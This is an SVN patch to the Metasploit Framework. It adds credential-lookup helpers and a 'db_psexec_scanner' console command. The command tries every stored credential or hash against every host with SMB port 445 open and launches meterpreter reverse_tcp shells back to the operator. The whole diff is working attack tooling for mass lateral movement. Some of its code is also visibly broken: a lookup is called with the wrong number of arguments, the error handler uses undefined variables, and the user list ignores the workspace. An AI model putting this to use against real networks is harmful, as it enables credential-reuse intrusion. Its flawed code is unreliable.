@@ -1,0 +1,178 @@
+Index: lib/msf/core/db.rb
+===================================================================
+--- lib/msf/core/db.rb	(revision 11383)
++++ lib/msf/core/db.rb	(working copy)
+@@ -512,6 +512,52 @@
+ 	end
+ 
+ 	#
++	# Find a specific credential by id
++	#
++	def find_cred_by_id(wspace, id)
++		Cred.find_by_id(id,
++			:include => {:service => :host},
++			:conditions => ["hosts.workspace_id = ?", wspace.id]
++		)
++	end
++
++	#
++	# Find credentials for a specific user
++	#
++	def find_unique_creds_by_user(wspace, user)
++		Cred.find(
++			:all,
++			:include => {:service => :host},
++			:conditions => ["hosts.workspace_id = ? AND user = ?", wspace.id, user],
++			:order => 'creds.id asc',
++			:group => 'pass'
++		)
++	end
++
++	#
++	# Find all unique creds
++	#
++	def unique_creds(wspace=workspace)
++		Cred.find(
++			:all,
++			:include => {:service => :host},
++			:conditions => ["hosts.workspace_id = ?", wspace.id],
++			:group => 'user, pass'
++		)
++	end
++
++	#
++	# Get a unique list of users
++	#
++	def users(wspace=workspace)
++		Cred.find( 
++			:all, 
++			:select => "distinct user",
++			:order => 'creds.user asc' 
++		).map {|u| u[:user]}
++	end
++
++	#
+ 	# This method returns a list of all exploited hosts in the database.
+ 	#
+ 	def exploited_hosts(wspace=workspace)
+Index: lib/msf/ui/console/command_dispatcher/db.rb
+===================================================================
+--- lib/msf/ui/console/command_dispatcher/db.rb	(revision 11383)
++++ lib/msf/ui/console/command_dispatcher/db.rb	(working copy)
+@@ -74,6 +74,7 @@
+ 				"db_import_qualys_xml"  => "Import a Qualys scan results file (XML)",
+ 				"db_import_msfe_xml"    => "Import a Metasploit Express report (XML)",
+ 				"db_nmap"               => "Executes nmap and records the output automatically",
++				"db_psexec_scanner" => "Uses stored password hashes and service information with psexec",
+ 			}
+ 
+ 			base.merge(more)
+@@ -2027,9 +2028,107 @@
+ 			res
+ 		end
+ 
++		def dump_creds
++			framework.db.users(framework.db.workspace).each do |user|
++				puts "#{user}:"
++
++				framework.db.find_unique_creds_by_user(framework.db.workspace, user).each do |cred|
++					puts "\t#{cred[:id]}: #{cred[:pass]}"
++				end
++			end
++		end
++
++		def build_creds(filter)
++			creds = []
++
++			if filter
++				filter.split(/,/).each do |id|
++					cred = framework.db.find_cred_by_id(id)
++					creds.push(cred) if cred
++				end
++			else
++				creds = framework.db.unique_creds(framework.db.workspace)
++			end
++
++			return creds
++		end
++
++		def psexec_scanner_usage
++			print_status("db_psexec_scanner -s <lhost> [-l] [-h] [-m <max_tries>] [-H <creds_list>]")
++			print_line("\t-s address - LHOST (can also be set with LHOST)")
++			print_line("\t[-H creds_list] - List credentials to use: ie. 3,4,5,9")
++			print_line("\t[-p port] - LPORT (can also be set with LPORT)")
++			print_line("\t[-t threads] - (default: 10) number of concurrent jobs to run)")
++			print_line("\t[-h] - You are looking at it")
++			print_line("\t[-l] - List credentials currently in the database")
++		end
++
++		def cmd_db_psexec_scanner(*args)
++
++			# Defaults
++			psexec = framework.modules.create('windows/smb/psexec')
++			psexec.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp" if psexec.datastore['PAYLOAD'].nil?
++			psexec.datastore['THREADS'] = 10 if psexec.datastore['THREADS'].nil?
++			psexec.datastore['ExitOnSession'] = false
++
++			while(arg = args.shift)
++				case arg
++					when '-h'
++						return psexec_scanner_usage
++					when '-s'
++						psexec.datastore['LHOST'] = args.shift
++					when '-p'
++						psexec.datastore['LPORT'] = args.shift
++					when '-l'
++						return dump_creds
++					when '-t'
++						psexec.datastore['THREADS'] = args.shift.to_i
++					when '-H'
++						psexec.datastore['CRED_LIST'] = args.shift
++
++				end
++			end
++
++			# Make sure we have all of our requirements
++			return psexec_scanner_usage if psexec.datastore['LHOST'].nil?
++
++			# Time for the fun
++			build_creds(psexec.datastore['CRED_LIST']).each do |cred|
++
++				Msf::DBManager::Service.find_all_by_port_and_proto_and_state(445, 'tcp', 'open').each do |service|
++					print_status "Trying #{service.host.address} with #{cred[:user]}:#{cred[:pass]}"
++
++					mod = framework.modules.create(psexec.fullname)
++					psexec.datastore.keys.map {|k| mod.datastore[k] = psexec.datastore[k].to_s.dup }
++				
++					mod.datastore['RHOST'] = service.host.address
++					mod.datastore['SMBUser'] = cred[:user]
++					mod.datastore['SMBPass'] = cred[:pass]
++					mod.datastore['LPORT'] = Random.new.rand(1025..65535) if psexec.datastore['LPORT'].nil?
++
++					# Borrowed from db_autopwn 
++					while(framework.jobs.keys.length >= psexec.datastore['THREADS'])
++						::IO.select(nil, nil, nil, 0.25)
++					end
++
++					Thread.new(mod) do |m|
++						begin
++							m.exploit_simple(
++								'Payload'        => m.datastore['PAYLOAD'],
++								'LocalInput'     => (m.datastore['DEBUG'] ? driver.input : nil),
++								'LocalOutput'    => (m.datastore['DEBUG'] ? driver.output : nil),
++								'RunAsJob'       => true
++							)
++
++						rescue Exception => e
++							print_status("Error while trying #{user}:#{password} against #{service.host.address}: #{$!} ")
++						end
++					end
++				end
++			end
++		end
+ end
+ end
+ end
+ end
+ end
+-
